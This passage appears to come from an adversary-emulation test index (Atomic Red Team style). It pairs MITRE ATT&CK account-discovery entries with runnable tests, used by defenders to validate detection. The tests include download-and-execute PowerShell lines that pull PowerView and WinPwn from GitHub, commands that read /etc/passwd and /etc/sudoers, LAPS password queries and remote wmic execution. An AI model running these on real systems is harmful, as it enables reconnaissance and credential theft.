        description: Russell, R. (n.d.). modinfo(8) - Linux man page. Retrieved March
          28, 2023.
        url: https://linux.die.net/man/8/modinfo
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1087.002:
    technique:
      modified: '2023-04-15T16:37:59.115Z'
      name: 'Account Discovery: Domain Account'
      description: "Adversaries may attempt to get a listing of domain accounts. This
        information can help adversaries determine which domain accounts exist to
        aid in follow-on behavior such as targeting specific accounts which possess
        particular privileges.\n\nCommands such as <code>net user /domain</code> and
        <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039)
        utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code>
        on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001)
        cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code>
        may enumerate members of Active Directory groups.  "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - ExtraHop
      - Miriam Wiesner, @miriamxyra, Microsoft Security
      x_mitre_deprecated: false
      x_mitre_detection: |
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Group: Group Enumeration'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Process: OS API Execution'
      type: attack-pattern
      id: attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af
      created: '2020-02-21T21:08:26.480Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1087/002
        external_id: T1087.002
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1087.002
    atomic_tests:
    - name: Enumerate all accounts (Domain)
      auto_generated_guid: 6fbc9e68-5ad7-444a-bd11-8bf3136c477e
      description: |
        Enumerate all accounts
        Upon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session
      supported_platforms:
      - windows
      executor:
        command: |
          net user /domain
          net group /domain
        name: command_prompt
    - name: Enumerate all accounts via PowerShell (Domain)
      auto_generated_guid: 8b8a6449-be98-4f42-afd2-dedddc7453b2
      description: 'Enumerate all accounts via PowerShell. Upon execution, lots of
        user account and group information will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          net user /domain
          get-localgroupmember -group Users
          get-aduser -filter *
        name: powershell
    - name: Enumerate logged on users via CMD (Domain)
      auto_generated_guid: 161dcd85-d014-4f5e-900c-d3eaae82a0f7
      description: 'Enumerate logged on users. Upon exeuction, logged on users will
        be displayed.

        '
      supported_platforms:
      - windows
      input_arguments:
        computer_name:
          description: Name of remote system to query
          type: string
          default: "%COMPUTERNAME%"
      executor:
        command: 'query user /SERVER:#{computer_name}

          '
        name: command_prompt
    - name: Automated AD Recon (ADRecon)
      auto_generated_guid: 95018438-454a-468c-a0fa-59c800149b59
      description: |
        ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its
        path will be displayed.
      supported_platforms:
      - windows
      input_arguments:
        adrecon_path:
          description: Path of ADRecon.ps1 file
          type: path
          default: "$env:TEMP\\ADRecon.ps1"
      dependency_executor_name: powershell
      dependencies:
      - description: 'ADRecon must exist on disk at specified location (#{adrecon_path})

          '
        prereq_command: 'if (Test-Path #{adrecon_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1"
          -OutFile #{adrecon_path}

          '
      executor:
        command: 'Invoke-Expression #{adrecon_path}

          '
        cleanup_command: |
          Remove-Item #{adrecon_path} -Force -ErrorAction Ignore | Out-Null
          Get-ChildItem $env:TEMP -Recurse -Force | Where{$_.Name -Match "^ADRecon-Report-"} | Remove-Item -Force -Recurse
        name: powershell
    - name: Adfind -Listing password policy
      auto_generated_guid: 736b4f53-f400-4c22-855d-1a6b5a551600
      description: |
        Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.
        reference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx
      supported_platforms:
      - windows
      input_arguments:
        adfind_path:
          description: Path to the AdFind executable
          type: path
          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})

          '
        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{adfind_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
      executor:
        command: "#{adfind_path} -default -s base lockoutduration lockoutthreshold
          lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength
          pwdproperties\n"
        name: command_prompt
    - name: Adfind - Enumerate Active Directory Admins
      auto_generated_guid: b95fd967-4e62-4109-b48d-265edfd28c3a
      description: |
        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts
        reference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/
      supported_platforms:
      - windows
      input_arguments:
        adfind_path:
          description: Path to the AdFind executable
          type: path
          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})

          '
        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{adfind_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
      executor:
        command: "#{adfind_path} -sc admincountdmp\n"
        name: command_prompt
    - name: Adfind - Enumerate Active Directory User Objects
      auto_generated_guid: e1ec8d20-509a-4b9a-b820-06c9b2da8eb7
      description: |
        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects
        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
      supported_platforms:
      - windows
      input_arguments:
        adfind_path:
          description: Path to the AdFind executable
          type: path
          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})

          '
        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{adfind_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
      executor:
        command: "#{adfind_path} -f (objectcategory=person)\n"
        name: command_prompt
    - name: Adfind - Enumerate Active Directory Exchange AD Objects
      auto_generated_guid: 5e2938fb-f919-47b6-8b29-2f6a1f718e99
      description: |
        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects
        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
      supported_platforms:
      - windows
      input_arguments:
        adfind_path:
          description: Path to the AdFind executable
          type: path
          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})

          '
        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{adfind_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
      executor:
        command: "#{adfind_path} -sc exchaddresses\n"
        name: command_prompt
    - name: Enumerate Default Domain Admin Details (Domain)
      auto_generated_guid: c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef
      description: 'This test will enumerate the details of the built-in domain admin
        account

        '
      supported_platforms:
      - windows
      executor:
        command: 'net user administrator /domain

          '
        name: command_prompt
    - name: Enumerate Active Directory for Unconstrained Delegation
      auto_generated_guid: 46f8dbe9-22a5-4770-8513-66119c5be63b
      description: |
        Attackers may attempt to query for computer objects with the UserAccountControl property
        'TRUSTED_FOR_DELEGATION' (0x80000;524288) set
        More Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce
        Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user
      supported_platforms:
      - windows
      input_arguments:
        domain:
          description: Domain FQDN
          type: string
          default: "$env:UserDnsDomain"
        uac_prop:
          description: UAC Property to search
          type: integer
          default: 524288
      dependencies:
      - description: 'PowerShell ActiveDirectory Module must be installed

          '
        prereq_command: |
          Try {
              Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
              exit 0
          }
          Catch {
              exit 1
          }
        get_prereq_command: |
          if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
            Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
          } else {
            Install-WindowsFeature RSAT-AD-PowerShell
          }
      executor:
        name: powershell
        elevation_required: false
        command: 'Get-ADObject -LDAPFilter ''(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})''
          -Server #{domain}

          '
    - name: Get-DomainUser with PowerView
      auto_generated_guid: 93662494-5ed7-4454-a04c-8c8372808ac2
      description: 'Utilizing PowerView, run Get-DomainUser to identify the domain
        users. Upon execution, Users within the domain will be listed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose
        name: powershell
    - name: Enumerate Active Directory Users with ADSISearcher
      auto_generated_guid: 02e8be5a-3065-4e54-8cc8-a14d138834d3
      description: |
        The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.
        Upon successful execution a listing of users will output with their paths in AD.
        Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: '([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()

          '
    - name: Enumerate Linked Policies In ADSISearcher Discovery
      auto_generated_guid: 7ab0205a-34e4-4a44-9b04-e1541d1a57be
      description: |
        The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.
        Upon successful execution a listing of users will output with their paths in AD.
        Reference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: '(([adsisearcher]''(objectcategory=organizationalunit)'').FindAll()).Path
          | %{if(([ADSI]"$_").gPlink){Write-Host "[+] OU Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink)
          -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host
          "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host
          "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName}
          };Write-Output "`n" }}

          '
    - name: Enumerate Root Domain linked policies Discovery
      auto_generated_guid: 00c652e2-0750-4ca6-82ff-0204684a6fe4
      description: |
        The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.
        Upon successful execution a listing of users will output with their paths in AD.
        Reference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: '(([adsisearcher]'''').SearchRooT).Path | %{if(([ADSI]"$_").gPlink){Write-Host
          "[+] Domain Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]"
          -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy
          Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host
          "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName}
          };Write-Output "`n" }}

          '
    - name: WinPwn - generaldomaininfo
      auto_generated_guid: ce483c35-c74b-45a7-a670-631d1e69db3d
      description: Gathers general domain information using the generaldomaininfo
        function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          generaldomaininfo -noninteractive -consoleoutput
        name: powershell
    - name: Kerbrute - userenum
      auto_generated_guid: f450461c-18d1-4452-9f0d-2c42c3f08624
      description: Enumerates active directory usernames using the userenum function
        of Kerbrute
      supported_platforms:
      - windows
      input_arguments:
        Domain:
          description: Domain that is being tested against
          type: string
          default: "$env:USERDOMAIN"
        DomainController:
          description: Domain Controller that is being tested against
          type: string
          default: "$env:UserDnsDomain"
      dependency_executor_name: powershell
      dependencies:
      - description: 'kerbrute.exe must exist in $env:temp.

          '
        prereq_command: 'if (test-path $env:temp\kerbrute.exe){exit 0} else {exit
          1}

          '
        get_prereq_command: 'invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe"
          -outfile "$env:TEMP\kerbrute.exe"

          '
      - description: 'username text file must exist in $env:temp.

          '
        prereq_command: 'if (test-path $env:temp\username.txt){exit 0} else {exit
          1}

          '
        get_prereq_command: 'invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true"
          -outfile "$env:TEMP\username.txt"

          '
      executor:
        command: |-
          cd $env:temp
          .\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} $env:TEMP\username.txt
        name: powershell
    - name: Wevtutil - Discover NTLM Users Remote
      auto_generated_guid: b8a563d4-a836-4993-a74e-0a19b8481bfe
      description: "This test discovers users who have authenticated against a Domain
        Controller via NTLM. \nThis is done remotely via wmic and captures the event
        code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n"
      supported_platforms:
      - windows
      executor:
        command: |-
          $target = $env:LOGONSERVER
          $target = $target.Trim("\\")
          $IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString
          wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\"Event[System[(EventID=4776)]]"'
        cleanup_command: 'Remove-Item -Path \\$IpAddress\c$\ntlmusers.evtx

          '
        name: powershell
    - name: Suspicious LAPS Attributes Query with Get-ADComputer all properties
      auto_generated_guid: 394012d9-2164-4d4f-b9e5-acf30ba933fe
      description: This test executes LDAP query using powershell command Get-ADComputer
        and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd
        and ms-mcs-AdmPwdExpirationTime
      supported_platforms:
      - windows
      input_arguments:
        hostname:
          description: Name of the host
          type: string
          default: "$env:computername"
      executor:
        command: 'Get-ADComputer #{hostname} -Properties *'
        cleanup_command: 
        name: powershell
        elevation_required: false
    - name: Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property
      auto_generated_guid: 6e85bdf9-7bc4-4259-ac0f-f0cb39964443
      description: This test executes LDAP query using powershell command Get-ADComputer
        and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime
      supported_platforms:
      - windows
      input_arguments:
        hostname:
          description: Name of the host
          type: string
          default: "$env:computername"
      executor:
        command: 'Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime'
        cleanup_command: 
        name: powershell
        elevation_required: false
    - name: Suspicious LAPS Attributes Query with Get-ADComputer all properties and
        SearchScope
      auto_generated_guid: ffbcfd62-15d6-4989-a21a-80bfc8e58bb5
      description: This test executes LDAP query using powershell command Get-ADComputer
        with SearchScope as subtree and lists all the properties including Microsoft
        LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime
      supported_platforms:
      - windows
      executor:
        command: Get-adcomputer -SearchScope subtree -filter "name -like '*'" -Properties
          *
        cleanup_command: 
        name: powershell
        elevation_required: false
    - name: Suspicious LAPS Attributes Query with adfind all properties
      auto_generated_guid: abf00f6c-9983-4d9a-afbc-6b1c6c6448e1
      description: This test executes LDAP query using adfind command and lists all
        the attributes including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime
      supported_platforms:
      - windows
      input_arguments:
        adfind_path:
          description: Path to adfind
          type: string
          default: C:\AtomicRedTeam\atomics\T1087.002\src\AdFind.exe
        domain:
          description: Domain of the host
          type: string
          default: "$env:USERDOMAIN"
      executor:
        command: '#{adfind_path} -h #{domain} -s subtree -f "objectclass=computer"
          *'
        cleanup_command: 
        name: powershell
        elevation_required: false
    - name: Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd
      auto_generated_guid: 51a98f96-0269-4e09-a10f-e307779a8b05
      description: This test executes LDAP query using adfind command and lists Microsoft
        LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime
      supported_platforms:
      - windows
      input_arguments:
        adfind_path:
          description: Path to adfind
          type: string
          default: C:\AtomicRedTeam\atomics\T1087.002\src\AdFind.exe
        domain:
          description: Domain of the host
          type: string
          default: "$env:USERDOMAIN"
      executor:
        command: '#{adfind_path} -h #{domain} -s subtree -f "objectclass=computer"
          ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime'
        cleanup_command: 
        name: powershell
        elevation_required: false
  T1063:
    technique:
      x_mitre_platforms:
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--241814ae-de3f-4656-b49e-f9a80764d4b7
      type: attack-pattern
      created: '2017-05-31T21:30:51.330Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1063
        external_id: T1063
      modified: '2020-02-21T21:17:03.347Z'
      name: Security Software Discovery
      description: |-
        Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1063) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.


        ### Windows

        Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.

        ### Mac

        It's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086).
      x_mitre_version: '2.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      - Administrator
      - SYSTEM
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1087.001:
    technique:
      modified: '2023-04-13T17:20:22.867Z'
      name: 'Account Discovery: Local Account'
      description: |-
        Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.

        Commands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Daniel Stepanic, Elastic
      - Miriam Wiesner, @miriamxyra, Microsoft Security
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        Monitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.4'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Process: OS API Execution'
      - 'Command: Command Execution'
      - 'File: File Access'
      - 'Group: Group Enumeration'
      type: attack-pattern
      id: attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e
      created: '2020-02-21T21:07:55.393Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1087/001
        external_id: T1087.001
      - source_name: Elastic - Koadiac Detection with EQL
        description: 'Stepanic, D.. (2020, January 13). Embracing offensive tooling:
          Building detections against Koadic using EQL. Retrieved November 30, 2020.'
        url: https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1087.001
    atomic_tests:
    - name: Enumerate all accounts (Local)
      auto_generated_guid: f8aab3dd-5990-4bf8-b8ab-2226c951696f
      description: 'Enumerate all accounts by copying /etc/passwd to another file

        '
      supported_platforms:
      - linux
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "/tmp/T1087.001.txt"
      executor:
        command: |
          cat /etc/passwd > #{output_file}
          cat #{output_file}
        cleanup_command: 'rm -f #{output_file}

          '
        name: sh
    - name: View sudoers access
      auto_generated_guid: fed9be70-0186-4bde-9f8a-20945f9370c2
      description: "(requires root)\n"
      supported_platforms:
      - linux
      - macos
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "/tmp/T1087.001.txt"
      executor:
        command: |
          sudo cat /etc/sudoers > #{output_file}
          cat #{output_file}
        cleanup_command: 'rm -f #{output_file}

          '
        name: sh
        elevation_required: true
    - name: View accounts with UID 0
      auto_generated_guid: c955a599-3653-4fe5-b631-f11c00eb0397
      description: 'View accounts with UID 0

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "/tmp/T1087.001.txt"
      executor:
        command: |
          grep 'x:0:' /etc/passwd > #{output_file}
          cat #{output_file} 2>/dev/null
        cleanup_command: 'rm -f #{output_file} 2>/dev/null

          '
        name: sh
    - name: List opened files by user
      auto_generated_guid: 7e46c7a5-0142-45be-a858-1a3ecb4fd3cb
      description: 'List opened files by user

        '
      supported_platforms:
      - linux
      - macos
      executor:
        command: 'username=$(id -u -n) && lsof -u $username

          '
        name: sh
      dependency_executor_name: sh
      dependencies:
      - description: 'check if lsof exists

          '
        prereq_command: 'which lsof

          '
        get_prereq_command: "(which yum && yum -y install lsof)||(which apt-get &&
          DEBIAN_FRONTEND=noninteractive apt-get install -y lsof)\n"
    - name: Show if a user account has ever logged in remotely
      auto_generated_guid: 0f0b6a29-08c3-44ad-a30b-47fd996b2110
      description: 'Show if a user account has ever logged in remotely

        '
      supported_platforms:
      - linux
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "/tmp/T1087.001.txt"
      dependency_executor_name: sh
      dependencies:
      - description: 'Check if lastlog command exists on the machine

          '
        prereq_command: 'if [ -x "$(command -v lastlog)" ]; then exit 0; else exit
          1; fi

          '
        get_prereq_command: 'sudo apt-get install login; exit 1;

          '
      executor:
        command: |
          lastlog > #{output_file}
          cat #{output_file}
        cleanup_command: 'rm -f #{output_file}

          '
        name: sh
    - name: Enumerate users and groups
      auto_generated_guid: e6f36545-dc1e-47f0-9f48-7f730f54a02e
      description: 'Utilize groups and id to enumerate users and groups

        '
      supported_platforms:
      - linux
      - macos
      executor:
        command: |
          groups
          id
        name: sh
    - name: Enumerate users and groups
      auto_generated_guid: 319e9f6c-7a9e-432e-8c62-9385c803b6f2
      description: 'Utilize local utilities to enumerate users and groups

        '
      supported_platforms:
      - macos
      executor:
        command: |
          dscl . list /Groups
          dscl . list /Users
          dscl . list /Users | grep -v '_'
          dscacheutil -q group
          dscacheutil -q user
        name: sh
    - name: Enumerate all accounts on Windows (Local)
      auto_generated_guid: 80887bec-5a9b-4efc-a81d-f83eb2eb32ab
      description: |
        Enumerate all accounts
        Upon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session
      supported_platforms:
      - windows
      executor:
        command: |
          net user
          dir c:\Users\
          cmdkey.exe /list
          net localgroup "Users"
          net localgroup
        name: command_prompt
    - name: Enumerate all accounts via PowerShell (Local)
      auto_generated_guid: ae4b6361-b5f8-46cb-a3f9-9cf108ccfe7b
      description: 'Enumerate all accounts via PowerShell. Upon execution, lots of
        user account and group information will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          net user
          get-localuser
          get-localgroupmember -group Users
          cmdkey.exe /list
          ls C:/Users
          get-childitem C:\Users\
          dir C:\Users\
          get-localgroup
          net localgroup
        name: powershell
    - name: Enumerate logged on users via CMD (Local)
      auto_generated_guid: a138085e-bfe5-46ba-a242-74a6fb884af3
      description: 'Enumerate logged on users. Upon execution, logged on users will
        be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: 'query user

          '
        name: command_prompt
  T1497.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Deloitte Threat Library Team
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--29be378d-262d-4e99-b00d-852d573628e6
      type: attack-pattern
      created: '2020-03-06T20:57:37.959Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1497.001
        url: https://attack.mitre.org/techniques/T1497/001
      - source_name: Deloitte Environment Awareness
        url: https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc
        description: Torello, A. & Guibernau, F. (n.d.). Environment Awareness. Retrieved
          May 18, 2021.
      - source_name: McAfee Virtual Jan 2017
        url: https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/stopping-malware-fake-virtual-machine/
        description: Roccia, T. (2017, January 19). Stopping Malware With a Fake Virtual
          Machine. Retrieved April 17, 2019.
      - source_name: Unit 42 OilRig Sept 2018
        description: Falcone, R., et al. (2018, September 04). OilRig Targets a Middle
          Eastern Government and Adds Evasion Techniques to OopsIE. Retrieved September
          24, 2018.
        url: https://researchcenter.paloaltonetworks.com/2018/09/unit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie/
      modified: '2021-10-18T14:57:07.973Z'
      name: 'Virtualization/Sandbox Evasion: System Checks'
      description: "Adversaries may employ various system checks to detect and avoid
        virtualization and analysis environments. This may include changing behaviors
        based on the results of checks for the presence of artifacts indicative of
        a virtual machine environment (VME) or sandbox. If the adversary detects a
